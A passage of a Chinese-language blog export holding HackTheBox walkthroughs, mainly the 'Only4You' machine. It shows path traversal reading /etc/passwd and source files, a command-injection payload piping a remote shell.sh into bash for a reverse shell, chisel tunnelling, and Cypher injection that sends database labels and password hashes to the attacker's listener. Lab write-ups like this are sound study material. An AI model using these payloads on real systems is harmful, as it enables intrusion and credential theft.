13:21 .cachedrwxr-xr-x  2 root root 4096 Mar 22 13:21 cactidrwxr-xr-x  3 root root 4096 Mar 22 13:21 .local-rw-r--r--  1 root root  161 Dec  5  2019 .profile-rw-r-----  1 root root   33 Jul 18 05:27 root.txtdrwx------  2 root root 4096 Mar 22 13:21 .ssh\n\n成功拿下root flag！\n\n\n总结总体还是比较简单，没啥特别卡人的点，比较友好。\n","categories":["HackTheBox"],"tags":["walkthrough"]},{"title":"[HTB]  Only4You","url":"/2023/07/24/Only4You/","content":"\n\n\n前言好难。再也不填非常简单了。\n信息收集nmap$ sudo nmap -p- --min-rate=10000 10.10.11.210Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-24 01:40 EDTNmap scan report for only4you.htb (10.10.11.210)Host is up (0.079s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 7.29 seconds$ sudo nmap -sT -sV -sC -O -p22,80 10.10.11.210Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-24 01:42 EDTNmap scan report for only4you.htb (10.10.11.210)Host is up (0.074s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   3072 e8:83:e0:a9:fd:43:df:38:19:8a:aa:35:43:84:11:ec (RSA)|   256 83:f2:35:22:9b:03:86:0c:16:cf:b3:fa:9f:5a:cd:08 (ECDSA)|_  256 44:5f:7a:a3:77:69:0a:77:78:9b:04:e0:9f:11:db:80 (ED25519)80/tcp open  http    nginx 1.18.0 (Ubuntu)|_http-title: Only4you|_http-server-header: nginx/1.18.0 (Ubuntu)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 13.15 seconds$ sudo nmap --script=vuln 10.10.11.210Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-24 01:42 EDTPre-scan script results:| broadcast-avahi-dos:|   Discovered hosts:|     224.0.0.251|   After NULL UDP avahi packet DoS (CVE-2011-1002).|_  Hosts are all up (not vulnerable).Nmap scan report for only4you.htb (10.10.11.210)Host is up (0.076s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  http| http-fileupload-exploiter:||_    Couldn&#x27;t find a file-type field.|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.| http-csrf:| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=only4you.htb|   Found the following possible CSRF vulnerabilities:||     Path: http://only4you.htb:80/|     Form id: name|_    Form action: /|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.Nmap done: 1 IP address (1 host up) scanned in 233.63 seconds\n\n看了22和80，那就80吧。\nnikto$ sudo nikto -h 10.10.11.210- Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          10.10.11.210+ Target Hostname:    10.10.11.210+ Target Port:        80+ Start Time:         2023-07-24 01:43:02 (GMT-4)---------------------------------------------------------------------------+ Server: nginx/1.18.0 (Ubuntu)+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ Root page / redirects to: http://only4you.htb/+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).+ 8074 requests: 0 error(s) and 3 item(s) reported on remote host+ End Time:           2023-07-24 01:53:38 (GMT-4) (636 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\n暂时没啥发现。\nwhatweb$ sudo whatweb http://only4you.htbhttp://only4you.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@only4you.htb], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.210], Lightbox, Script, Title[Only4you], nginx[1.18.0]\n\n\n\nweb渗透手动访问网站我们把only4you.htb加入hosts中，访问一下看看。\n\n搞的像模像样，其实实际上没几个按钮是有用的。我们再四处看看。\n在QA里面里第三个问题的here处找到一个可以跳转的子域名。\n\n我们把beta.only4you.htb也加入hosts中，访问一下看看。\n\n发现是一个网站展示他们产品的网页，他甚至还提供了源代码，那我们下载下来看看吧。\n代码审计我们大体看一下源代码就可以知道，其实就是一个很简单的，用flask跑了一个网站服务器，在上面部署了重新调整图片大小以及转换图片的功能罢了。在beta.only4you.htb上也有对应的服务页面。\n\n\n我们明显可以发现这两个服务还提供文件上传功能，那我们是不是可以利用呢？那得细看一下源代码。\n@app.route(&#x27;/resize&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def resize():    if request.method == &#x27;POST&#x27;:        if &#x27;file&#x27; not in request.files:            flash(&#x27;Something went wrong, Try again!&#x27;, &#x27;danger&#x27;)            return redirect(request.url)        file = request.files[&#x27;file&#x27;]        img = secure_filename(file.filename)        if img != &#x27;&#x27;:            ext = os.path.splitext(img)[1]            if ext not in app.config[&#x27;UPLOAD_EXTENSIONS&#x27;]:                flash(&#x27;Only png and jpg images are allowed!&#x27;, &#x27;danger&#x27;)                return redirect(request.url)                file.save(os.path.join(app.config[&#x27;RESIZE_FOLDER&#x27;], img))            status = resizeimg(img)            if status == False:                flash(&#x27;Image is too small! Minimum size needs to be 700x700&#x27;, &#x27;danger&#x27;)                return redirect(request.url)            else:                flash(&#x27;Image is succesfully uploaded!&#x27;, &#x27;success&#x27;)        else:            flash(&#x27;No image selected!&#x27;, &#x27;danger&#x27;)            return redirect(request.url)        return render_template(&#x27;resize.html&#x27;, clicked=&quot;True&quot;), &#123;&quot;Refresh&quot;: &quot;5; url=/list&quot;&#125;    else:        return render_template(&#x27;resize.html&#x27;, clicked=&quot;False&quot;)@app.route(&#x27;/convert&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def convert():    if request.method == &#x27;POST&#x27;:        if &#x27;file&#x27; not in request.files:            flash(&#x27;Something went wrong, Try again!&#x27;, &#x27;danger&#x27;)            return redirect(request.url)        file = request.files[&#x27;file&#x27;]        img = secure_filename(file.filename)        if img != &#x27;&#x27;:            ext = os.path.splitext(img)[1]            if ext not in app.config[&#x27;UPLOAD_EXTENSIONS&#x27;]:                flash(&#x27;Only jpg and png images are allowed!&#x27;, &#x27;danger&#x27;)                return redirect(request.url)                file.save(os.path.join(app.config[&#x27;CONVERT_FOLDER&#x27;], img))            if ext == &#x27;.png&#x27;:                image = convertpj(img)                return send_from_directory(app.config[&#x27;CONVERT_FOLDER&#x27;], image, as_attachment=True)            else:                image = convertjp(img)                return send_from_directory(app.config[&#x27;CONVERT_FOLDER&#x27;], image, as_attachment=True)        else:            flash(&#x27;No image selected!&#x27;, &#x27;danger&#x27;)            return redirect(request.url)         return render_template(&#x27;convert.html&#x27;)    else:        [f.unlink() for f in Path(app.config[&#x27;CONVERT_FOLDER&#x27;]).glob(&quot;*&quot;) if f.is_file()]        return render_template(&#x27;convert.html&#x27;)\n\n看了一下， img = secure_filename(file.filename)以及ext = os.path.splitext(img)[1]这两条把我们限制的比较难受，不太好利用。但是天无绝人之路，往下看看发现/download更有利用的可能性。\n@app.route(&#x27;/download&#x27;, methods=[&#x27;POST&#x27;])def download():    image = request.form[&#x27;image&#x27;]    filename = posixpath.normpath(image)     if &#x27;..&#x27; in filename or filename.startswith(&#x27;../&#x27;):        flash(&#x27;Hacking detected!&#x27;, &#x27;danger&#x27;)        return redirect(&#x27;/list&#x27;)    if not os.path.isabs(filename):        filename = os.path.join(app.config[&#x27;LIST_FOLDER&#x27;], filename)    try:        if not os.path.isfile(filename):            flash(&#x27;Image doesn\\&#x27;t exist!&#x27;, &#x27;danger&#x27;)            return redirect(&#x27;/list&#x27;)    except (TypeError, ValueError):        raise BadRequest()    return send_file(filename, as_attachment=True)\n\n表面上代码posixpath.normpath(image)来规范化路径，避免路径遍历，也用了if &#39;..&#39; in filename or filename.startswith(&#39;../&#39;)来避免路径遍历。第一次有了posixpath.normpath和..匹配，本来是两件很美好的事情，加在一起为什么会变成这样。实际上，posixpath.normpath把这变成马奇诺防线了，我们可以写个脚本测试一下。\n$ cat test.pyimport posixpathwhile 1:    image = input(&#x27;file:&#x27;)    filename = posixpath.normpath(image)    print(filename)    if &#x27;..&#x27; in filename or filename.startswith(&#x27;../&#x27;):        print(&#x27;Hacking detected!&#x27;)    else:        print(&#x27;Good&#x27;)$ python test.pyfile:../../etc/passwd../../etc/passwdHacking detected!file:/etc/passwd/etc/passwdGoodfile:./etc/passwdetc/passwdGoodfile:/.././etc/passwd/etc/passwdGood\n\n我们可以看到，posixpath.normpath本意是把路径规范化，把多余的什么../以及.等多余的路径都删掉剩下最后路径。结果显然后面的匹配就没意义了。\n$ curl http://beta.only4you.htb/download --data &quot;image=/../etc/passwd&quot;root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:106::/nonexistent:/usr/sbin/nologinsyslog:x:104:110::/home/syslog:/usr/sbin/nologin_apt:x:105:65534::/nonexistent:/usr/sbin/nologintss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/falseuuidd:x:107:112::/run/uuidd:/usr/sbin/nologintcpdump:x:108:113::/nonexistent:/usr/sbin/nologinlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologinpollinate:x:110:1::/var/cache/pollinate:/bin/falseusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinsshd:x:112:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinjohn:x:1000:1000:john:/home/john:/bin/bashlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/falsemysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/falseneo4j:x:997:997::/var/lib/neo4j:/bin/bashdev:x:1001:1001::/home/dev:/bin/bashfwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin_laurel:x:996:996::/var/log/laurel:/bin/false\n\n实际上我们直接--data &quot;image=/etc/passwd&quot;也可以看到。\nLFI利用我们验证了LFI漏洞的存在，但是我们要怎么利用呢？我们要看哪些文件？其实很自然的，我们现在看到了子域名beta网站的源代码，发现了漏洞，那我们能不能看看主站的源代码呢？那我们就需要知道具体的路径了。当然前面基本上是/var/www/没差了，我们试了下常见的html也不对，光在这猜也是不是个事，那我们就要想哪些东西的路径是相对固定的，没错，日志。我们之前whatweb以及扫描都发现了网站是基于nginx的，我们知道nginx的日志分为访问日志和错误日志，默认路径分别是/var/log/nginx/access.log以及/var/log/nginx/error.log。我们可以都看看。\naccess log一堆乱七八糟的记录，不想看，看看远处的error log：\n$ curl http://beta.only4you.htb/download --data &quot;image=/var/log/nginx/error.log&quot;2023/07/24 03:06:32 [error] 1047#1047: *11 upstream prematurely closed connection while reading response header from upstream, client: 10.10.14.6, server: only4you.htb, request: &quot;POST / HTTP/1.1&quot;, upstream: &quot;http://unix:/var/www/only4you.htb/only4you.sock:/&quot;, host: &quot;only4you.htb&quot;2023/07/24 03:42:25 [error] 1047#1047: *489 upstream prematurely closed connection while reading response header from upstream, client: 10.10.14.238, server: only4you.htb, request: &quot;POST / HTTP/1.1&quot;, upstream: &quot;http://unix:/var/www/only4you.htb/only4you.sock:/&quot;, host: &quot;only4you.htb&quot;, referrer: &quot;http://only4you.htb/&quot;\n\n提供了我们最需要的路径/var/www/only4you.htb/。那我们就可以看看主站的源代码了。\n然而主站使用什么写的呢？php？aspx？其实要index.php这样一个一个试也可以，但是我们刚才可以发现beta网站和主站风格是相似的，如果beta用python写的，主站也用python写的概率是极大的。那我们试试默认网页app.py看看能不能读取。\n$ curl http://beta.only4you.htb/download --data &quot;image=/var/www/only4you.htb/app.py&quot;from flask import Flask, render_template, request, flash, redirectfrom form import sendmessageimport uuidapp = Flask(__name__)app.secret_key = uuid.uuid4().hex@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def index():    if request.method == &#x27;POST&#x27;:        email = request.form[&#x27;email&#x27;]        subject = request.form[&#x27;subject&#x27;]        message = request.form[&#x27;message&#x27;]        ip = request.remote_addr        status = sendmessage(email, subject, message, ip)        if status == 0:            flash(&#x27;Something went wrong!&#x27;, &#x27;danger&#x27;)        elif status == 1:            flash(&#x27;You are not authorized!&#x27;, &#x27;danger&#x27;)        else:            flash(&#x27;Your message was successfuly sent! We will reply as soon as possible.&#x27;, &#x27;success&#x27;)        return redirect(&#x27;/#contact&#x27;)    else:        return render_template(&#x27;index.html&#x27;)@app.errorhandler(404)def page_not_found(error):    return render_template(&#x27;404.html&#x27;), 404@app.errorhandler(500)def server_errorerror(error):    return render_template(&#x27;500.html&#x27;), 500@app.errorhandler(400)def bad_request(error):    return render_template(&#x27;400.html&#x27;), 400@app.errorhandler(405)def method_not_allowed(error):    return render_template(&#x27;405.html&#x27;), 405if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;127.0.0.1&#x27;, port=80, debug=False)\n\n发现竟然还真是。\n我们看一下代码就会发现其实没啥内容，主要实现的功能就一个sendmessage功能，也就是主页那个发送消息的框。\n\n之前其实手动尝试过是否存在sql注入漏洞啥的，并没什么发现，那我们研究下其具体实现看看有无可以利用的点吧。然而app.py并没其具体实现，我们看其实从form中import来的，显然form明显不是一个标准的python库，那说明其是一个同目录下的单独的py文件。那我们看看其代码。\n$ curl http://beta.only4you.htb/download --data &quot;image=/var/www/only4you.htb/form.py&quot;import smtplib, refrom email.message import EmailMessagefrom subprocess import PIPE, runimport ipaddressdef issecure(email, ip):        if not re.match(&quot;([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\\.[A-Z|a-z]&#123;2,&#125;)&quot;, email):                return 0        else:                domain = email.split(&quot;@&quot;, 1)[1]                result = run([f&quot;dig txt &#123;domain&#125;&quot;], shell=True, stdout=PIPE)                output = result.stdout.decode(&#x27;utf-8&#x27;)                if &quot;v=spf1&quot; not in output:                        return 1                else:                        domains = []                        ips = []                        if &quot;include:&quot; in output:                                dms = &#x27;&#x27;.join(re.findall(r&quot;include:.*\\.[A-Z|a-z]&#123;2,&#125;&quot;, output)).split(&quot;include:&quot;)                                dms.pop(0)                                for domain in dms:                                        domains.append(domain)                                while True:                                        for domain in domains:                                                result = run([f&quot;dig txt &#123;domain&#125;&quot;], shell=True, stdout=PIPE)                                                output = result.stdout.decode(&#x27;utf-8&#x27;)                                                if &quot;include:&quot; in output:                                                        dms = &#x27;&#x27;.join(re.findall(r&quot;include:.*\\.[A-Z|a-z]&#123;2,&#125;&quot;, output)).split(&quot;include:&quot;)                                                        domains.clear()                                                        for domain in dms:                                                                domains.append(domain)                                                elif &quot;ip4:&quot; in output:                                                        ipaddresses = &#x27;&#x27;.join(re.findall(r&quot;ip4:+[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+[/]?[0-9]&#123;2&#125;&quot;, output)).split(&quot;ip4:&quot;)                                                        ipaddresses.pop(0)                                                        for i in ipaddresses:                                                                ips.append(i)                                                else:                                                        pass                                        break                        elif &quot;ip4&quot; in output:                                ipaddresses = &#x27;&#x27;.join(re.findall(r&quot;ip4:+[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+[/]?[0-9]&#123;2&#125;&quot;, output)).split(&quot;ip4:&quot;)                                ipaddresses.pop(0)                                for i in ipaddresses:                                        ips.append(i)                        else:                                return 1                for i in ips:                        if ip == i:                                return 2                        elif ipaddress.ip_address(ip) in ipaddress.ip_network(i):                                return 2                        else:                                return 1def sendmessage(email, subject, message, ip):        status = issecure(email, ip)        if status == 2:                msg = EmailMessage()                msg[&#x27;From&#x27;] = f&#x27;&#123;email&#125;&#x27;                msg[&#x27;To&#x27;] = &#x27;info@only4you.htb&#x27;                msg[&#x27;Subject&#x27;] = f&#x27;&#123;subject&#125;&#x27;                msg[&#x27;Message&#x27;] = f&#x27;&#123;message&#125;&#x27;                smtp = smtplib.SMTP(host=&#x27;localhost&#x27;, port=25)                smtp.send_message(msg)                smtp.quit()                return status        elif status == 1:                return status        else:                return status\n\n确实如此。\n代码审计2.0我们需要重点关注的是这一部分。主要其中的run(shell=True)函数很吸引我们。\nif not re.match(&quot;([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\\.[A-Z|a-z]&#123;2,&#125;)&quot;, email):        return 0else:        domain = email.split(&quot;@&quot;, 1)[1]        result = run([f&quot;dig txt &#123;domain&#125;&quot;], shell=True, stdout=PIPE)        output = result.stdout.decode(&#x27;utf-8&#x27;)        if &quot;v=spf1&quot; not in output:                return 1\n\n在Python中，run([f&quot;&quot;], shell=True, stdout=PIPE) 是用于执行外部命令的一种方法。这是通过subprocess模块的run()函数来实现的。\n我们发现，函数对domain的处理是将通过@将邮箱两部分分离，取后一部分运行dig命令。很显然这里存在代码注入的问题，因为我们只要构造类似xxx@xxx.xxx;payload的payload就能既绕过过滤又可以进行RCE拿shell了。\n如果你说这里代码审计分析好难分析不出来怎么办？问chatgpt呗。\n\n善用工具就能很好实现我们的目标。\nRCE我们先尝试了最喜欢bash -i以及nc，但是就算url编码了还是不能成功get shell，估计和&amp;这些符号有关，但是我们其实还可以用curl来反弹shell。我们先写好shell.sh，再在本地用python开一个简单的http server 。\n$ curl http://only4you.htb/ --data &quot;name=111&amp;email=1%401.com;curl &lt;HTB_VPN_IP&gt;:8888/shell.sh | sh&amp;subject=111&amp;message=111&quot;&lt;!doctype html&gt;&lt;html lang=en&gt;&lt;title&gt;Redirecting...&lt;/title&gt;&lt;h1&gt;Redirecting...&lt;/h1&gt;&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;/#contact&quot;&gt;/#contact&lt;/a&gt;. If not, click the link.\n\n我们服务器确实接受到了请求，但是为啥没收到shell？难道是没有sh的原因？很怪，我们试试bash执行。\n$ curl http://only4you.htb/ --data &quot;name=111&amp;email=1%401.com;curl &lt;HTB_VPN_IP&gt;:8888/shell.sh | bash&amp;subject=111&amp;message=111&quot;\n\n这次成功拿到了反弹shell。\n$ sudo nc -nlvp 4444listening on [any] 4444 ...connect to [&lt;HTB_VPN_IP&gt;] from (UNKNOWN) [10.10.11.210] 47256bash: cannot set terminal process group (1013): Inappropriate ioctl for devicebash: no job control in this shellwww-data@only4you:~/only4you.htb$\n\n提权内网服务发现然而拿到shell只能说迈出了第一步，这个www-data哪怕有点权限也不会一点也没有，拿不到user flag，只能考虑先提权到用户权限再说了。\n四处看了看也没找到啥提权的好途径，上linpeas看看。\n╔══════════╣ Active Ports╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-portstcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1040/nginx: workertcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -tcp6       0      0 127.0.0.1:7474          :::*                    LISTEN      -tcp6       0      0 :::22                   :::*                    LISTEN      -tcp6       0      0 127.0.0.1:7687          :::*                    LISTEN      -\n\n除了发现本地还开了很多其他端口以外，其他的东西都没啥入手点。我们先细看一下都有哪些端口在lisaten状态。\nwww-data@only4you:~/only4you.htb$ netstat -natpnetstat -natpActive Internet connections (servers and established)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program nametcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1040/nginx: workertcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -tcp        0     14 10.10.11.210:40060      &lt;HTB_VPN_IP&gt;:4444        ESTABLISHED 1257/bashtcp        0      1 10.10.11.210:44060      8.8.8.8:53              SYN_SENT    -tcp6       0      0 127.0.0.1:7474          :::*                    LISTEN      -tcp6       0      0 :::22                   :::*                    LISTEN      -tcp6       0      0 127.0.0.1:7687          :::*                    LISTEN      -\n\n其中3000和8001都不知道是啥，3306和33060明显是mysql的端口,7474和7687都是neo4j的端口，但这些都是默认情况下的，具体是不是还得我们自己确认。\n由于这些服务都跑在内网里，所以我们要先进行内网穿透，可以用chisel或者frp都可以，frp要自己手动写一下配置文件，我懒得写，这里就用chisel了，比较方便。\n在本机起一个服务端。\n$ ./chisel server -p 8000 --reverse2023/07/24 04:49:59 server: Reverse tunnelling enabled2023/07/24 04:49:59 server: Fingerprint XMxZkZvd1PTuA20hOGgOyRF36iBDf9cR5dxT/zr0eBc=2023/07/24 04:49:59 server: Listening on http://0.0.0.0:8000\n\n在靶机上起客户端转发。\nwww-data@only4you:/tmp$ ./chisel client &lt;HTB_VPN_IP&gt;:8000 R:3000:127.0.0.1:3000 R:8001:127.0.0.1:8001 R:7474:127.0.0.1:7474 &amp;&lt;:3000 R:8001:127.0.0.1:8001 R:7474:127.0.0.1:7474 &amp;[1] 18440\n\n收到了连接。\n2023/07/24 04:50:32 server: session#1: tun: proxy#R:3000=&gt;3000: Listening2023/07/24 04:50:32 server: session#1: tun: proxy#R:8001=&gt;8001: Listening2023/07/24 04:50:32 server: session#1: tun: proxy#R:7474=&gt;7474: Listening\n\n然后我们打开浏览器就可以正常访问这些内网服务了。\n3000端口：\n\n3000端口上跑的服务是Gogs，有点类似github。我们直接在登录页面尝试弱密码，没得手。\n7474端口：\n\n7474端口如预料的一样跑的是neo4j的数据库web管理页面。试着登录没成功。\n8001端口：\n\n直接就是一个登录页面，试着登录，成功了？我们用admin:admin的弱密码成功登录了。\n\n然后就是这么一个页面，不知道有啥用。但是我们看一下task那里，我们发现说是数据库迁移成了neo4j，很合理，毕竟7687就跑着neo4j的服务呢。我们再看看employees页面，发现有个搜索框。\n\n既然都是数据库，neo4j有没有注入漏洞呢？我们直接谷歌查一下neo4j injection,发现喜闻乐见的还真有。HackTricks上就有详细介绍，neo4j的注入叫Cypher Injection。\nCypher Injection我们照着来，本地开一个http服务器监听。\n先查版本:\n&#x27; OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM &#x27;http://&lt;HTB_VPN_IP&gt;:7777/?version=&#x27; + version + &#x27;&amp;name=&#x27; + name + &#x27;&amp;edition=&#x27; + edition as l RETURN 0 as _0 //\n\n直接丢就搜索框查就行，如果要用burpsuite或者firefox的编辑重发，记得URL编码一下。\n$ python3 -m http.server 7777Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...10.10.11.210 - - [24/Jul/2023 05:22:55] code 400, message Bad request syntax (&#x27;GET /?version=5.6.0&amp;name=Neo4j Kernel&amp;edition=community HTTP/1.1&#x27;)10.10.11.210 - - [24/Jul/2023 05:22:55] &quot;GET /?version=5.6.0&amp;name=Neo4j Kernel&amp;edition=community HTTP/1.1&quot; 400 -\n\n发现能成功接收到返回。\n再查一下标签（类似mysql中的表概念）：\n&#x27;&#125;) RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM &#x27;http://&lt;HTB_VPN_IP&gt;:7777/?l=&#x27;+label as l RETURN 0 as _0 \n\n我们直接照抄发现没反应，观察一下与第一个的区别，怀疑是闭合的问题，我们照着第一个请求改一下。\n&#x27; OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM &#x27;http://&lt;HTB_VPN_IP&gt;:7777/?l=&#x27;+label as l RETURN 0 as _0 //\n\nOK了。\n10.10.11.210 - - [24/Jul/2023 05:33:09] &quot;GET /?l=user HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:33:09] &quot;GET /?l=employee HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:33:09] &quot;GET /?l=user HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:33:09] &quot;GET /?l=employee HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:33:09] &quot;GET /?l=user HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:33:09] &quot;GET /?l=employee HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:33:09] &quot;GET /?l=user HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:33:10] &quot;GET /?l=employee HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:33:10] &quot;GET /?l=user HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:33:10] &quot;GET /?l=employee HTTP/1.1&quot; 200 \n\n有两个label我们肯定更想查user，看看有无其他用户的登录凭证。\n&#x27; OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM &#x27;http://10.10.14.96:7777/?&#x27; + p +&#x27;=&#x27;+toString(f[p]) as l RETURN 0 as _0 //\n\n10.10.11.210 - - [24/Jul/2023 05:35:01] &quot;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:35:01] &quot;GET /?username=admin HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:35:01] &quot;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:35:01] &quot;GET /?username=john HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:35:01] &quot;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:35:01] &quot;GET /?username=admin HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:35:02] &quot;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:35:02] &quot;GET /?username=john HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:35:02] &quot;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:35:02] &quot;GET /?username=admin HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:35:02] &quot;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:35:02] &quot;GET /?username=john HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:35:03] &quot;GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:35:03] &quot;GET /?username=admin HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:35:03] &quot;GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:35:03] &quot;GET /?username=john HTTP/1.1&quot; 200 -10.10.11.210 - - [24/Jul/2023 05:35:03] &quot;GET 